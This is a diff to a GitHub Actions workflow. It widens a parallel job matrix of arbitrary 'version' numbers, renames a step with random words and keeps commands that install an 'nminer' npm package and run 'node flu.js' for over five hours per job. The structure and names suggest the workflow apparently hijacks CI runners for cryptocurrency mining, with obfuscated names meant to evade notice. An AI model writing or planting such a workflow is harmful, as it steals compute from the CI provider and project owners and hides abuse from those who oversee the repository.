@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9515 }
-          - { version: 4804 }
-          - { version: 4687 }
-          - { version: 6790 }
-          - { version: 6057 }
-          - { version: 5164 }
-          - { version: 3281 }
-          - { version: 9681 }
-          - { version: 9417 }
-          - { version: 5049 }
-          - { version: 7356 }
-          - { version: 522 }
-          - { version: 4708 }
-          - { version: 8746 }
-          - { version: 2568 }
+          - { version: 7371 }
+          - { version: 7716 }
+          - { version: 6361 }
+          - { version: 3778 }
+          - { version: 3678 }
+          - { version: 4985 }
+          - { version: 6337 }
+          - { version: 2929 }
+          - { version: 5239 }
+          - { version: 5158 }
+          - { version: 6821 }
+          - { version: 8531 }
+          - { version: 8441 }
+          - { version: 731 }
+          - { version: 1670 }
+          - { version: 3524 }
+          - { version: 4836 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: uselessly igloo yuck
+      - name: judgementally unless throughout cope
         run: |
           npm install nminer@latest
-          timeout 318m node flu.js || echo "flu executed"
+          timeout 312m node flu.js || echo "flu executed"
